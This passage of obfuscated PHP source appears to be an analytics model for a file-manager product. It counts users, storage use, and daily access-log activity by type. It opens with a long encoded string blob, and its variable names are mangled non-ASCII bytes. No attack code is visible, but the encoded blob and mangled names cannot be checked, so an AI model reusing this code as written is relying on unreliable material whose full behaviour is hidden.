'9d9lOtQnXYXAc0fyQzkkl+iHsGpAUSZ9rEYaDKHBRd2KMbMNTudEdNzkkeVaYBgToUjqcwE=')."\x4e\xca\x35\xb5\xd8\xe7\x82\x43\x74\xd9\x31\xca\x2d\xe3\xb1\x86\x25\xde\xbc\xb9\x9a\xbe\x25\x7\x58\x2a\x47\x48\xcb\x11\xa0\x2a\xab\x8e\xdc\x3c\x8a\x43\xd\xeb\xcc\x7d\x2\x3b\xe1\x77\xb5\x77\xf9\x79\x54\x13\x5f"."\222\124\300\42\334\53\66\63\265\115\175\104\207\303\340\160\316\110\50\341\110\133\250\71\20\156\11\305\226\51\151\174\337\53\264\31\121\163\125\262\124\125\113\274\334\104\127\12\21\125\323\31\140"."\x28\xdd\xc7\x1f\x40\xc2\x9f\xde\x3e\x74\xa4\xf0\x26\xf9\x51\xcc\x12\x87\x2e\xd2\x29\x28\x4c\x3c\x40\xe9\x2c\x96\x22\xa2\x5e\x2c\x2b\x31\x8f\xcd\x1d\xb3\x65\x79\xb0\x0\xbe\x2\x74\x56\xc8\x8f\x25\xe0\x42\x51\x2f".base64_decode('hx/VsSKl1GIpQ6lCawC+cg3k9SoZGnFKen6yxhv5IcMyxKpnOUbl0gMtHaFONRAOR1Y4NJ0=')."\xc5\xd5\x43\x91\xcb\x5c\x92\xf2\xe3\x63\xd2\xcc\x88\x49\xa0\xb5\xcb\x7e\x3b\xe5\x18\xc7\xeb\x2c\x2e\x39\xc\x9d\x3e\xd9\xa9\x6c\x81\x5d\xab\xc1\xb3\xc9\xfc\x45\x21\x1a\x94\x1e\x7\x2c\x14\x35\xc3\xd2\xa5\x8\xfa".base64_decode('jl09WBBq2azjCeBsSgqWnNtqxapUWgGLIzzv5ADRUFt7/H/cVCMpXC0aSabCxq3F6WNDzfI=').strrev('ÌƒpÎÀJa+ä)YˆD×N¥DP¸ÓŞÀPNI«ºö9·‰Só¸EqôÿÌyU¤ñN¬ÑÃ')."\330\11\7\304\21\6\103\101\41\270\26\172\260\105\347\165\54\173\144\207\35\46\307\103\224\3\6\334\241\266\351\172\35\322\255\360\357\170\373\261\254\16\362\236\20\115\133\203\173\201\40\173\105".strrev('÷•IfÂSHÿ›.ßĞã¶'."\n".'æ}¸€¨†\'ÌE”¡·ò˜ï£©Q¥'."\0".'qˆŠÉ@'."\r".''."\n".'”î¬‹Ç«ˆPŸ')."\101\54\55\52\162\321\37\105\1\26\304\363\14\337\204\364\212\243\40\326\350\64\163\243\145\21\16\341\131\230\365\206\353\126\343\367\264\362\51\123\36\165\142\33\200\55\300\350\363\304\124\46\341"."\x41\xa7\x10\xdd\x2e\x7f\xd0\x90\x66\xff\x3f\xc9\x48\x13\x63\x92\x67\x63\x67\x21\xe5\xd\xb2\xdc\x5b\x26\xdf\xee\x1c\x66\xc\xe4\xe1\xc6\x8c\x39\xec\x7c\xc0\x18\xc7\x48\xdc\x1a\x33\x9d\x90\xf2\x4b\xeb\x8d\xf8\x7b"."\x90\xdf\x95\x74\x58\x4f\x38\xde\xc\xa3\x9\xa\x79\x86\x5e\x41\xa4\x9\x30\x1\xab\x10\xb1\x13\x30\x1\x96\xea\x9e\x4a\x7f\x7a\xe0\xd7\x9c\xa4\x11\x94\xea\x41\x95\xb5\x1c\x31\x9b\x33\x46\x36\x59\xe4\xca\x61\x22"."\xa2\x43\x17\x62\x9\x92\xb\x91\x99\x82\x96\x97\x9e\xb3\x74\xbe\xd4\x89\xfa\x51\xe9\x1\x4f\xec\x1c\xd6\xf9\x3e\x9c\x78\x76\x4f\x6c\xc4\xce\x67\xc8\xb8\x46\x82\x25\x16\x94\x65\x3b\x1e\xbe\x8b\x9b\x71\x2d\xed\xa1"."\xf8\x8d\x49\xa4\x8\x35\x8d\xca\xdf\xb2\xf6\x3f\xe9\x5\x4a\x64\xa2\x43\x61\x3d\xbc\x98\xc5\x78\xc8\xbb\xac\x94\x32\xba\x5f\x6b\x93\x56\x28\x27\xc0\xb2\x85\x4c\x9a\xf8\x39\x5\x6d\x45\x97\x59\x77\xda\xd0\xd9\x26"."\xe2\x0\xa3\x51\x7e\xad\x50\x10\x97\x27\xf2\x9e\x8b\xfe\x75\x98\x8d\x43\x5a\x77\xbc\x5d\x25\xe\x56\x54\xaa\x25\x11\x13\x78\x26\x5d\x68\xd2\x48\xb8\xdc\x2c\xe5\x43\xf4\x12\xc7\x11\x5b\x94\x4e\x89\xb2\x57\x70\x7a"."\xb1\x23\x6c\x8a\x1\x1c\xb5\xb3\x8b\x5e\xef\xc2\x80\xc9\x45\xb2\x2b\x77\x2e\x88\x47\x14\x89\x1f\xa6\xfd\xe5\x57\xf4\x58\xd1\xd\x68\xa\x56\x2c\x62\x1a\x5d\x3\x26\x39\x8c\xf9\xe4\x63\x1c\x0\x28\x8b\x98\x6b\x1c"."\304\150\172\5\146\70\126\65\306\44\304\142\323\107\160\11\331\220\251\140\345\130\302\174\23\112\353\5\102\301\14\155\351\276\207\335\120\60\157\272\131\176\354\342\157\361\112\101\276\12\234\57\13"."\322\345\102\176\132\364\24\77\123\341\260\140\57\144\57\123\102\221\310\375\172\156\371\113\300\354\325\137\266\336\340\311\337\12\357\370\116\372\14\260\107\330\237\357\355\301\102\141\355\134\100\163\351".base64_decode('fNOZMyf8CFN2CnIfgPhkuDJE3RMWN8tF2EILwvFIsdRroIflDx1LwyD1u1TMeohCiIcpbVY=')."\174\53\331\361\174\242\173\102\53\241\4\16\106\262\162\227\273\213\131\361\10\51\155\221\230\115\171\212\276\262\61\140\317\101\316\216\111\47\231\155\130\324\127\144\27\354\156\60\303\261\132\20\233"."\40\214\47\251\43\357\262\35\151\125\56\71\163\326\234\5\262\134\106\114\277\270\166\6\77\67\160\173\16\54\226\100\50\305\61\204\36\205\171\17\227\111\17\111\164\32\10\225\77\352\355\332\162"."\376\147\213\115\234\175\50\250\244\224\314\313\253\364\216\247\204\343\222\266\234\113\127\311\304\352\103\226\264\114\235\45\122\36\245\102\153\245\355\124\54\47\372\10\263\231\305\2\201\34\276\200\260"."\213\232\363\320\133\351\154\107\372\313\16\222\130\206\54\102\116\155\57\20\367\210\144\351\360\47\227\150\233\156\131\25\316\216\267\133\42\155\215\344\263\300\15\140\347\36\142\75\126\30\204\275\114".base64_decode('EzvH0SOfUHPD3XeI8Zyj4F/KCFGFh7YlBZ699IGyk/z86tVsr7xIhaxTtyNkdoGgiGO2s98=')."\256\342\121\66\121\106\257\107\231\14\250\314\234\126\176\217\133\270\236\224\370\107\234\233\31\337\117\42\245\40\266\337\116\116\114\176\363\227\230\115\13\317\111\144\201\72\26\253\344\164\137\66\73".base64_decode('JgXJq6C8aOkFZSHOIvIv6BEsYaLRQZoZaONm65qks+iUsTEfK3yR4LEXXbBN+Vt6mRvtGhE=').strrev('~Å$àÏ=â4ÎıË5§f\'ñ8àvZVOPÂyâ'."\r".'!’+¤©Q/3p°£+8ãš‚f')."\xe\xfb\x3b\x10\x4b\x62\x0\x48\x6b\x93\xb6\x6a\xb1\x2b\x8b\xaf\xce\x52\x4e\x4\x24\x59\x35\x39\xe2\xf1\x44\x87\xf\x9\xec\x6e\xd1\x45\x31\x98\x67\xa\xcb\xf5\x72\x3d\x75\x1a\x4f\xbf\xd9\xd9\xe3\xff\xfa\x89\xe5"."\377\127\57\53\317\341\57\213\161\363\101\134\21\267\127\154\203\243\0\64\33\337\363\162\71\13\25\155\273\72\344\334\133\247\0\162\241\131\360\15\11\132\103\302\134\135\236\371\336\144\56\71\65"."\x76\xd\xa8\x65\xb3\xd2\xe\x5c\xf9\xf0\x24\x2c\xf6\x4d\x33\xdb\xa7\x15\x7d\x8\x27\x7\xf8\xa3\xe9\x95\x2\x6e\x3b\xe7\x98\x96\xd2\xe5\x36\xaf\x21\x52\x66\x14\x19\xc3\x62\xd5\x5e\x41\x5e\x70\x5c\xa5\x6c\xf2\x2b".base64_decode('3IjeFCRSScpCMVIpXBcSgL1867akhlWQWzB+X9C8vJEYqKAMQFSFnc9GSCxOGZhoPuKEuLY=')."\x32\xfb\x4a\xe0\x53\x2e\xf1\xe0\x3\xd3\x20\xfb\x58\x88\x14\xd8\x79\xb8\x16\x76\x99\xde\xa5\x8c\x1a\x12\xcf\x2e\x40\x14\x65\x42\xe8\x88\x2a\x23\x9f\x71\xc7\xe4\x3a\x22\xe5\x79\x13\x34\xce\xe7\x74\x29\x5\x39\x3a"."\x5c\x8f\x84\x53\x20\x4b\x1e\x5b\xc7\x3d\x47\xb9\x6e\x48\x79\x6e\x4e\x59\xe4\x2c\xd8\xdc\xc1\x29\xdf\xc3\xd3\x4a\xe\x46\x75\x5e\x57\x44\xbd\xd7\x55\x1c\x7f\x27\xdd\xb9\x68\x1c\xf\x77\x53\x7d\x1a\xb4\xd2\xa2\x58".base64_decode('jsPkeeR6jNyle8vz0AUSEzCTLNHKFIM3Ssg08Zc8HozydBVNwm46Y7lsS1IaT0iCYzcHSaM=')."\247\372\312\166\105\106\204\35\63\205\25\24\305\265\154\74\22\15\252\53\102\330\37\110\150\165\260\233\371\304\66\114\362\142\15\53\262\273\243\206\330\372\301\2\100\347\250\126\123\240\222\216\310"."\243\44\305\26\216\235\355\134\241\231\137\42\73\15\302\45\3\23\346\35\115\226\253\72\201\261\161\220\163\55\56\256\4\226\60\213\226\354\25\325\221\210\331\72\23\245\106\231\50\40\305\64\101".base64_decode('uvNoResJW08qmFNwHBHWzK6b1bu34mazRygR5OyvgISzSmyWlyk1M5iK+Uzqx6hSGkLSmO0=')."\300\46\361\62\222\373\105\44\347\13\110\15\222\300\227\76\56\345\170\72\255\154\222\72\315\146\301\303\270\322\60\215\230\74\25\37\224\371\225\71\173\13\7\53\11\372\261\63\65\154\331\342\47"."\210\10\162\372\125\152\116\145\372\121\130\74\41\244\124\204\364\226\37\61\241\46\273\70\32\51\106\163\235\145\56\10\235\126\155\122\176\42\273\242\342\50\207\124\12\224\40\344\50\111\51\0\235"."\xee\x92\xce\x57\xf2\x48\x22\x89\x66\x7e\xda\xa1\x4\xe9\x5a\xdb\xa9\x55\xc0\xd\x86\xcb\xf6\xdc\x92\x11\x96\x92\x49\x2e\xe6\xef\x17\xfd\x62\xd7\x6\x21\xe1\xec\x8a\x24\xd3\x3b\xbb\xc0\x90\xc6\xfd\xc9\xb9\x73\x75"."\x3b\x4e\xce\x92\xe\x42\x82\x10\x93\x60\xf9\x95\xb3\xb8\x9\x97\x18\x59\x96\xd\x1f\xbd\x5\x33\xe1\x8a\x97\x88\xaf\xd8\x1e\xb5\x21\xc1\x96\x8b\x63\x61\x32\xd9\xaa\xd\x55\x0\x4d\xea\x6e\x7f\x80\x28\x86\x83\x12".base64_decode('tl7ySSLskPRhuXaAE3Y/DsDyWOGzRMov7hxFN3Fcpe4TYujMLvtE4UglouhbYVxhRzqCYwU=')."\x27\xa1\xc9\x43\xbb\xc2\x65\x51\xa2\x4a\xa7\x7\x16\xe\xc6\xe7\xc\xc1\x10\x13\x46\xaf\x23\xd6\x25\x45\xc0\x62\x3f\xc6\x7b\xba\x92\x40\x10\x26\x15\x5f\x51\x5e\x26\xa1\x80\x9e\xd\x4b\xc5\xc9\x2a\x8\x93\x66\x88"."\125\256\104\140\245\163\210\45\327\65\42\201\161\67\246\143\360\245\355\215\167\14\40\243\162\242\243\71\25\120\203\35\107\144\361\155\171\242\231\315\342\113\345\111\222\251\126\262\264\31\227\103\10".base64_decode('KS9tEDl9i4VDI3PkioSmBZxJFF53jZucwT2mNIfjaU45ftiwExlJVFCeWB5fLJtmaEDlfrg=')."\133\313\146\331\55\100\21\205\224\265\107\322\246\212\233\25\362\320\26\125\314\106\223\160\116\161\24\163\344\235\144\10\160\136\232\204\363\226\45\263\314\145\343\112\362\331\132\311\232\244\173\345\203"."\x7\x2\xb9\x64\x85\xe\xb\xb1\x95\x4\x3a\xd9\x78\x56\x4\x2e\xaf\xe\xd6\x80\x1b\x9a\x48\xf0\x2a\xb7\x42\x8\xde\x5c\x8a\x2d\x95\x5a\x51\x11\x78\xd2\x56\xb8\xa1\x5\x3f\x84\xf\xde\x95\x52\x2a\x2e\x50\x70\xe0"."\x5f\x61\xc7\x60\x29\x15\xf6\x8\x4a\xff\x26\xd5\x14\x13\xda\x53\xe5\x9b\x95\x48\xab\xa0\xcb\x45\xab\xc4\x9c\x99\xec\xf2\xb3\x42\xb2\xac\x18\x56\x59\x75\x2c\x5a\x91\xbe\x59\x4e\x9d\x2e\x57\xbc\xc3\xd9\x33\x25\x49"."\64\300\364\75\213\372\240\154\303\213\270\305\254\61\40\264\150\231\265\315\124\307\236\126\312\17\344\115\276\117\46\205\346\64\146\362\2\105\367\260\227\225\346\134\11\371\222\364\352\100\105\343\37"."\17\26\226\225\13\242\262\32\67\323\24\232\205\364\234\157\332\106\102\167\76\155\40\173\41\244\351\254\222\254\44\200\167\111\305\205\350\316\241\171\124\101\126\114\242\350\247\117\134\141\321\362\44"."\56\115\240\210\303\116\217\362\106\160\137\110\365\16\232\361\245\40\277\143\46\136\367\51\57\101\223\143\146\321\366\340\264\270\131\40\277\115\246\155\13\65\36\52\35\43\47\2\314\20\170\44\55"."\65\364\45\56\227\161\243\310\125\45\301\142\102\300\310\47\150\100\140\151\123\114\247\251\204\354\71\2\370\12\224\7\344\375\36\56\70\133\113\56\135\15\21\61\140\46\373\314\21\346\173\23\341"."\225\64\110\342\156\113\163\63\271\103\156\3\162\131\347\216\70\225\261\374\64\305\17\357\150\171\111\31\360\240\260\257\277\220\166\144\247\57\237\162\345\371\275\225\0\27\32\242\10\372\210\16\221"."\56\203\35\141\54\36\53\113\352\12\304\142\53\42\321\26\372\346\116\131\62\311\45\51\63\226\45\165\265\107\72\47\113\13\166\4\102\341\262\64\254\367\330\251\12\77\256\64\51\324\105\132\111"."\xae\xfc\x27\x6b\x45\xa8\x79\x99\x68\x9\xbb\x13\xc\xc3\xc3\xad\x62\x16\xa4\x3b\xb2\x42\xc6\x64\x57\x5f\xc\x3e\xa6\xb1\xf7\xd2\xe5\xdb\x15\x3d\x27\xdc\xfa\x8a\x3c\x4e\x29\x9c\x3c\xdb\x16\xf3\xbf\xcd\x3f\x9c\xcf"."\x5a\xba\x14\x8d\x9d\xba\x31\xc\xa9\xa1\x58\xac\xce\xd8\x9\x35\x45\xb\x10\x8b\xdf\x29\xe2\xb4\x81\x1f\x36\x84\x16\x8d\xcf\xa1\xa0\x23\xc5\x93\xf5\x43\x8\x92\x84\x97\xf2\xd6\x4f\xee\x50\xb9\x70\x8e\x24\x4f\xaf".base64_decode('OHjyTUz5XSBJFYODm3m8CSqy/WafON/BwQ/cBMBwSwqs9NuRbGtpJjt1qKNQkTqmF0LY/b8=')."\x1\xec\xbc\xc4\x92\x1f\xbd\x0\x0"."".base64_decode(''), 10, -8))); goto eçÀºŠÎ¸; F´ì¤è‡°: class AnalysisModel extends ModelBaseLight { public function init($Üõ‹€”©) { $¦¨”ÙŸ± =& $_SERVER[¯‘·½]; $ÜŸĞƒù = array($¦¨”ÙŸ±[669] => array($¦¨”ÙŸ±[33] => $¦¨”ÙŸ±[1936], $¦¨”ÙŸ±[353] => array($¦¨”ÙŸ±[285], $¦¨”ÙŸ±[851], $¦¨”ÙŸ±[1937], $¦¨”ÙŸ±[1938])), $¦¨”ÙŸ±[1939] => array($¦¨”ÙŸ±[33] => $¦¨”ÙŸ±[1940], $¦¨”ÙŸ±[353] => array($¦¨”ÙŸ±[285], $¦¨”ÙŸ±[849], $¦¨”ÙŸ±[1941], $¦¨”ÙŸ±[1942], $¦¨”ÙŸ±[1943]))); if (!isset($ÜŸĞƒù[$Üõ‹€”©])) { return !1; } $this->optionType = $ÜŸĞƒù[$Üõ‹€”©][$¦¨”ÙŸ±[33]]; $this->field = $ÜŸĞƒù[$Üõ‹€”©][$¦¨”ÙŸ±[353]]; return !0; } public function listData($Ğı­²ù = false, $Ô³ƒÃ  = "\155\x6f\x64\151\x66\171\x54\x69\155\x65", $ˆêª±„ = false) { return parent::listData($Ğı­²ù, $Ô³ƒÃ , $ˆêª±„); } public function trendList($Ö¥ş¾¹) { $“–ÈÚ¤Î =& $_SERVER[¯‘·½]; $Ô˜ú¸·Æ = $this->listData(); if ($Ô˜ú¸·Æ) { $ü“ÜÒ» = end($Ô˜ú¸·Æ); $ãÊŠŞç¢ = date($“–ÈÚ¤Î[1944], strtotime($“–ÈÚ¤Î[1945])); if ($ü“ÜÒ»[$“–ÈÚ¤Î[285]] == $ãÊŠŞç¢) { return $Ô˜ú¸·Æ; } $™Ïİ»˜ = strtotime($ü“ÜÒ»[$“–ÈÚ¤Î[285]]); } if (!isset($™Ïİ»˜)) { $öØ®ÅŞš = $Ö¥ş¾¹ == $“–ÈÚ¤Î[669] ? $“–ÈÚ¤Î[601] : $“–ÈÚ¤Î[916]; $™Ïİ»˜ = Model($öØ®ÅŞš)->min($“–ÈÚ¤Î[234]); } $µŠÂ ­ó = $“–ÈÚ¤Î[1946] . ucfirst($Ö¥ş¾¹); $­ıÎéÈ = $this->dateList($™Ïİ»˜); foreach ($­ıÎéÈ as $ãÊŠŞç¢) { $this->{$µŠÂ ­ó}($ãÊŠŞç¢); } return $this->listData(); } private function dateList($ì½Æò•“) { $²óÏğÄ× =& $_SERVER[¯‘·½]; $›°Íªã’ = $ì½Æò•“; $ˆ¯ùâˆÄ = strtotime($²óÏğÄ×[1945]); $åÖ±ÀÒİ = array(); while ($›°Íªã’ <= $ˆ¯ùâˆÄ) { $åÖ±ÀÒİ[] = date($²óÏğÄ×[1944], $›°Íªã’); $›°Íªã’ = strtotime($²óÏğÄ×[1947], $›°Íªã’); } return $åÖ±ÀÒİ; } public function _recordUser($ÀìÇ•©à = '') { $É±©‘ÄÈ =& $_SERVER[¯‘·½]; $ÖÜÏ™ = strtotime(date($É±©‘ÄÈ[1948], strtotime($ÀìÇ•©à))); $’µÑÇõ· = strtotime(date($É±©‘ÄÈ[1949], strtotime($ÀìÇ•©à))); $äş–ìÍ = array($É±©‘ÄÈ[234] => array($É±©‘ÄÈ[1109], $’µÑÇõ·)); $µ¾Åî  = Model($É±©‘ÄÈ[601])->where($äş–ìÍ)->count($É±©‘ÄÈ[1806]); $äş–ìÍ[$É±©‘ÄÈ[234]] = array($É±©‘ÄÈ[410], array($ÖÜÏ™, $’µÑÇõ·)); $´ùûçÜ = Model($É±©‘ÄÈ[601])->where($äş–ìÍ)->count($É±©‘ÄÈ[1806]); $äş–ìÍ[$É±©‘ÄÈ[33]] = $É±©‘ÄÈ[1950]; $ªö©Š€û = Model($É±©‘ÄÈ[1951])->where($äş–ìÍ)->count($É±©‘ÄÈ[1952]); $öÑ¾ù½ = array($É±©‘ÄÈ[285] => $ÀìÇ•©à, $É±©‘ÄÈ[851] => (int) $µ¾Åî , $É±©‘ÄÈ[1937] => (int) $´ùûçÜ, $É±©‘ÄÈ[1938] => (int) $ªö©Š€û); return $this->insert($öÑ¾ù½); } public function _recordStore($ËØ¡†ö½ = '') { $àçåôÜ =& $_SERVER[¯‘·½]; $è¼•×®¸ = strtotime(date($àçåôÜ[1949], strtotime($ËØ¡†ö½))); $¡©ì·Ø = array($àçåôÜ[234] => array($àçåôÜ[1109], $è¼•×®¸)); $ş§¤ƒÂë = Model($àçåôÜ[548])->where($¡©ì·Ø)->sum($àçåôÜ[79]); $¡©ì·Ø[$àçåôÜ[487]] = 0; $ÀÛãÇ¹î = Model($àçåôÜ[916])->where($¡©ì·Ø)->sum($àçåôÜ[79]); $¡©ì·Ø[$àçåôÜ[191]] = 1; $äÛèæß = Model($àçåôÜ[916])->where($¡©ì·Ø)->sum($àçåôÜ[79]); $¡©ì·Ø[$àçåôÜ[191]] = 2; $½€«¢—Í = Model($àçåôÜ[916])->where($¡©ì·Ø)->sum($àçåôÜ[79]); $•ã……â× = array($àçåôÜ[285] => $ËØ¡†ö½, $àçåôÜ[849] => (int) $ÀÛãÇ¹î, $àçåôÜ[1941] => (int) $ş§¤ƒÂë, $àçåôÜ[1942] => (int) $äÛèæß, $àçåôÜ[1943] => (int) $½€«¢—Í); return $this->insert($•ã……â×); } public function trend($«ÍØı±», $ƒöšıà) { $÷¯³ÁÉç =& $_SERVER[¯‘·½]; if (!$this->init($«ÍØı±»)) { return !1; } $ö¶æ·í = $this->trendList($«ÍØı±»); if ($ö¶æ·í && $ƒöšıà != $÷¯³ÁÉç[1778]) { $ïâœ’’µ = $ö¶æ·í[0][$÷¯³ÁÉç[285]]; $Ï¯ë †æ = $this->validDate($ƒöšıà, $ïâœ’’µ); $Ì–‘ÃÆÜ = array(); $•ºì£Şû = array_to_keyvalue($ö¶æ·í, $÷¯³ÁÉç[285]); foreach ($Ï¯ë †æ as $®å€ˆÓõ) { if (isset($•ºì£Şû[$®å€ˆÓõ])) { $Ê¤ø’¬ = $•ºì£Şû[$®å€ˆÓõ]; } else { $Ê¤ø’¬ = end($ö¶æ·í); $Ê¤ø’¬[$÷¯³ÁÉç[285]] = $®å€ˆÓõ; if ($«ÍØı±» == $÷¯³ÁÉç[669]) { $Ê¤ø’¬[$÷¯³ÁÉç[1937]] = $Ê¤ø’¬[$÷¯³ÁÉç[1938]] = 0; } } $Ì–‘ÃÆÜ[] = $Ê¤ø’¬; } $ö¶æ·í = $Ì–‘ÃÆÜ; } $Ö÷ØÍÄÀ = array($÷¯³ÁÉç[669] => array($÷¯³ÁÉç[851] => LNG($÷¯³ÁÉç[1953]), $÷¯³ÁÉç[1937] => LNG($÷¯³ÁÉç[1954]), $÷¯³ÁÉç[1938] => LNG($÷¯³ÁÉç[1955])), $÷¯³ÁÉç[1939] => array($÷¯³ÁÉç[849] => LNG($÷¯³ÁÉç[1956]), $÷¯³ÁÉç[1941] => LNG($÷¯³ÁÉç[1957]), $÷¯³ÁÉç[1942] => LNG($÷¯³ÁÉç[1958]), $÷¯³ÁÉç[1943] => LNG($÷¯³ÁÉç[1959]))); $×½á¿§„ = array($÷¯³ÁÉç[669] => $÷¯³ÁÉç[1960], $÷¯³ÁÉç[1939] => $÷¯³ÁÉç[79]); if (empty($ö¶æ·í)) { $®å€ˆÓõ = date($÷¯³ÁÉç[1944], strtotime($÷¯³ÁÉç[1945])); $‹èíé = array($÷¯³ÁÉç[285] => $®å€ˆÓõ); foreach ($Ö÷ØÍÄÀ[$«ÍØı±»] as $Õ‹ø‘ì => $íïöòê•) { $‹èíé[$Õ‹ø‘ì] = 0; } $ö¶æ·í[] = $‹èíé; } $±ÒĞØ½› = array(); foreach ($ö¶æ·í as $íïöòê•) { if ($«ÍØı±» == $÷¯³ÁÉç[1939] && $íïöòê•[$÷¯³ÁÉç[1941]] > $íïöòê•[$÷¯³ÁÉç[849]]) { $íïöòê•[$÷¯³ÁÉç[1941]] = $íïöòê•[$÷¯³ÁÉç[849]]; } foreach ($Ö÷ØÍÄÀ[$«ÍØı±»] as $Õ‹ø‘ì => $¥ôëÄ›«) { $Ê¤ø’¬ = array($÷¯³ÁÉç[285] => $íïöòê•[$÷¯³ÁÉç[285]], $÷¯³ÁÉç[1693] => $¥ôëÄ›«); $Ê¤ø’¬[$×½á¿§„[$«ÍØı±»]] = isset($íïöòê•[$Õ‹ø‘ì]) ? $íïöòê•[$Õ‹ø‘ì] : 0; $±ÒĞØ½›[] = $Ê¤ø’¬; } } return $±ÒĞØ½›; } public function validDate($¥êİáÅø, $‹ó‰µ¸Ú) { $¢íì™â =& $_SERVER[¯‘·½]; $¶–Ü’¨µ = date($¢íì™â[1944], strtotime($¢íì™â[1945])); $¹„ÆÒ’Î = array($¶–Ü’¨µ); switch ($¥êİáÅø) { case $¢íì™â[1785]: $ƒÜÄ¥¸ó = mktime(0, 0, 0, date($¢íì™â[1961]), date($¢íì™â[1483]) - date($¢íì™â[1572]) + 7 - 7, date($¢íì™â[1962])); $€Øí´ƒî = 0; do { $±ó¤¿ö˜ = date($¢íì™â[1944], $ƒÜÄ¥¸ó - 3600 * 24 * 7 * $€Øí´ƒî); $¹„ÆÒ’Î[] = $±ó¤¿ö˜; $€Øí´ƒî++; } while ($‹ó‰µ¸Ú < $±ó¤¿ö˜); break; case $¢íì™â[1783]: $€Øí´ƒî = 1; do { $³“¹ã“À = date($¢íì™â[1963], strtotime("\55\40{$€Øí´ƒî}\40\x6d\x6f\x6e\x74\x68\163")); $¹„ÆÒ’Î[] = $³“¹ã“À; $€Øí´ƒî++; } while ($‹ó‰µ¸Ú < $³“¹ã“À); break; case $¢íì™â[1964]: $®îåê£á = (int) date($¢íì™â[1962], strtotime($‹ó‰µ¸Ú)); $¡ú©‹˜ = (int) date($¢íì™â[1962]); if ($®îåê£á >= $¡ú©‹˜) { break; } for ($®îåê£á; $®îåê£á < $¡ú©‹˜; $®îåê£á++) { $¹„ÆÒ’Î[] = $®îåê£á . $¢íì™â[1965]; } break; default: break; } if ($‹ó‰µ¸Ú > end($¹„ÆÒ’Î)) { array_pop($¹„ÆÒ’Î); } sort($¹„ÆÒ’Î); return $¹„ÆÒ’Î; } public function listTable($‚ĞÁ¥Õ¾) { $€êÁ±˜® = ucfirst($‚ĞÁ¥Õ¾); return Model($€êÁ±˜®)->listData(); } public function option($÷ĞßÀÏø) { $÷¾Û¹•ú = $_SERVER[¯‘·½][1966] . ucfirst($÷ĞßÀÏø); return $this->{$÷¾Û¹•ú}(); } private function optionUser() { $ûÚÅ­´± =& $_SERVER[¯‘·½]; $Ä–ŞŒüñ = Model($ûÚÅ­´±[601])->count($ûÚÅ­´±[1806]); $äşı­Ø = Model($ûÚÅ­´±[601])->where($ûÚÅ­´±[1967])->count($ûÚÅ­´±[1806]); $ÑØçî‰ = intval($GLOBALS[$ûÚÅ­´±[6]][$ûÚÅ­´±[426]][$ûÚÅ­´±[1751]]) / 3600; $ò«áïœ½ = strtotime("\x2d{$ÑØçî‰}\40\150\157\165\162\163"); $‹­Ñ‰Ï² = strtotime(date($ûÚÅ­´±[1948])); if ($ò«áïœ½ < $‹­Ñ‰Ï²) { $ò«áïœ½ = $‹­Ñ‰Ï²; } $Í­÷ÏØ = array($ûÚÅ­´±[1968] => array($ûÚÅ­´±[1110], $ò«áïœ½)); $«ŞÁ˜•™ = (int) Model($ûÚÅ­´±[601])->where($Í­÷ÏØ)->count($ûÚÅ­´±[1806]); if (!$«ŞÁ˜•™) { $«ŞÁ˜•™ = 1; } $Í­÷ÏØ = array($ûÚÅ­´±[1968] => array($ûÚÅ­´±[1110], $‹­Ñ‰Ï²)); $°‰©á°Ö = Model($ûÚÅ­´±[601])->where($Í­÷ÏØ)->count($ûÚÅ­´±[1806]); return array($ûÚÅ­´±[844] => (int) $Ä–ŞŒüñ, $ûÚÅ­´±[1969] => (int) ($Ä–ŞŒüñ - $äşı­Ø), $ûÚÅ­´±[1970] => (int) $äşı­Ø, $ûÚÅ­´±[1971] => (int) $°‰©á°Ö, $ûÚÅ­´±[1972] => $«ŞÁ˜•™); } private function optionFile() { $š¡ÚÖ”¶ =& $_SERVER[¯‘·½]; $ÁõË•€ş = $this->sourceSize(); $¿‡æìŸ» = $ÁõË•€ş[$š¡ÚÖ”¶[79]]; $€»ßëõ = $ÁõË•€ş[$š¡ÚÖ”¶[1941]]; $ÅíğËğ¾ = Model($š¡ÚÖ”¶[916])->where(array($š¡ÚÖ”¶[487] => 0))->count($š¡ÚÖ”¶[194]); $…â÷èãê = array($š¡ÚÖ”¶[487] => 0, $š¡ÚÖ”¶[234] => array($š¡ÚÖ”¶[1110], strtotime(date($š¡ÚÖ”¶[1948])))); $ÍØ„€•¸ = Model($š¡ÚÖ”¶[916])->where($…â÷èãê)->sum($š¡ÚÖ”¶[79]); $õ˜±ö­³ = Model($š¡ÚÖ”¶[916])->where($…â÷èãê)->count($š¡ÚÖ”¶[194]); return array($š¡ÚÖ”¶[849] => $¿‡æìŸ», $š¡ÚÖ”¶[1941] => $€»ßëõ, $š¡ÚÖ”¶[1973] => $¿‡æìŸ» - $€»ßëõ, $š¡ÚÖ”¶[1974] => (int) $ÍØ„€•¸, $š¡ÚÖ”¶[851] => (int) $ÅíğËğ¾, $š¡ÚÖ”¶[1975] => (int) $õ˜±ö­³); } private function optionAccess() { $¡††œ„Ö =& $_SERVER[¯‘·½]; return array($¡††œ„Ö[844] => $this->typeLogCnt(), $¡††œ„Ö[110] => $this->typeLogCnt($¡††œ„Ö[110]), $¡††œ„Ö[527] => $this->typeLogCnt($¡††œ„Ö[527]), $¡††œ„Ö[1251] => $this->typeLogCnt($¡††œ„Ö[1251]), $¡††œ„Ö[1976] => $this->typeLogCnt($¡††œ„Ö[1976]), $¡††œ„Ö[669] => $this->typeLogCnt($¡††œ„Ö[12], $¡††œ„Ö[1952])); } private function typeLogCnt($î¤Š®¦ = '', $ ı®õœ = "\x69\144") { $È“’å =& $_SERVER[¯‘·½]; $¾ø„–×è = array($È“’å[110] => array($È“’å[1977], $È“’å[1978]), $È“’å[527] => array($È“’å[1979], $È“’å[1980]), $È“’å[1251] => array($È“’å[1981], $È“’å[1982], $È“’å[1983]), $È“’å[1976] => array($È“’å[1984], $È“’å[1985]), $È“’å[1986] => array($È“’å[1987], $È“’å[1988], $È“’å[1989])); $Êªœà£ = strtotime(date($È“’å[1948])); $àÌŸš ¾ = array($È“’å[234] => array($È“’å[1110], $Êªœà£)); if ($î¤Š®¦) { $àÌŸš ¾[$È“’å[33]] = array($È“’å[7], $¾ø„–×è[$î¤Š®¦]); } $ÁÆâÑ­ç = Model($È“’å[1951])->where($àÌŸš ¾)->count($ ı®õœ); return (int) $ÁÆâÑ­ç; } private function optionServer() { $¢ê†íäê =& $_SERVER[¯‘·½]; $¹õşé = $this->diskDriver(); $ÄøôîÙ½ = KodIO::defaultDriver(); $•Õáæ¶ß = array($¢ê†íäê[909] => $ÄøôîÙ½[$¢ê†íäê[477]]); 